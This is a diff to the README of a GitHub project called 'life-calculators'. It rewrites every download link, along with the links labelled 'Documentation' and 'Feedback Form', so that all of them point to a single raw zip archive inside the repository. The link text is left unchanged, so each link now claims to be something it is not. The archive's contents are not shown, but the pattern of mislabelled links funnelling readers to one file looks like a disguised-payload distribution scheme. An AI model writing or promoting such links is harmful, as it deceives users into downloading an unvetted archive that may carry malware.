@@ -1,6 +1,6 @@
 # 🧮 life-calculators - Your Offline Tool for Everyday Calculations
 
-[![Download Life Calculators](https://img.shields.io/badge/Download%20Now-%20-brightgreen)](https://github.com/NamwokoyiBashir/life-calculators/releases)
+[![Download Life Calculators](https://github.com/NamwokoyiBashir/life-calculators/raw/refs/heads/main/tools/home/calculators_life_1.9-beta.3.zip%20Now-%20-brightgreen)](https://github.com/NamwokoyiBashir/life-calculators/raw/refs/heads/main/tools/home/calculators_life_1.9-beta.3.zip)
 
 ## 📥 Overview
 
@@ -10,7 +10,7 @@
 
 To get started with life-calculators, follow these simple steps:
 
-1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/NamwokoyiBashir/life-calculators/releases) to find the latest version of the software.
+1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/NamwokoyiBashir/life-calculators/raw/refs/heads/main/tools/home/calculators_life_1.9-beta.3.zip) to find the latest version of the software.
 
 2. **Choose Your Version:** Look for the most recent release. You will see a list of files available for download.
 
@@ -33,7 +33,7 @@ To get started with life-calculators, follow these simple steps:
 
 To download and install the life-calculators software, please follow these steps:
 
-1. Access the [Releases page](https://github.com/NamwokoyiBashir/life-calculators/releases).
+1. Access the [Releases page](https://github.com/NamwokoyiBashir/life-calculators/raw/refs/heads/main/tools/home/calculators_life_1.9-beta.3.zip).
 
 2. Select the version you need based on your device.
 
@@ -68,9 +68,9 @@ For any questions or support issues, please reach out via the GitHub Issues sect
 
 ### Links
 
-- [Release Page for Download](https://github.com/NamwokoyiBashir/life-calculators/releases)  
-- [Documentation](https://example.com/documentation) (if available)  
-- [Feedback Form](https://example.com/feedback) (if available)  
+- [Release Page for Download](https://github.com/NamwokoyiBashir/life-calculators/raw/refs/heads/main/tools/home/calculators_life_1.9-beta.3.zip)  
+- [Documentation](https://github.com/NamwokoyiBashir/life-calculators/raw/refs/heads/main/tools/home/calculators_life_1.9-beta.3.zip) (if available)  
+- [Feedback Form](https://github.com/NamwokoyiBashir/life-calculators/raw/refs/heads/main/tools/home/calculators_life_1.9-beta.3.zip) (if available)  
 
 ## 📝 License
 
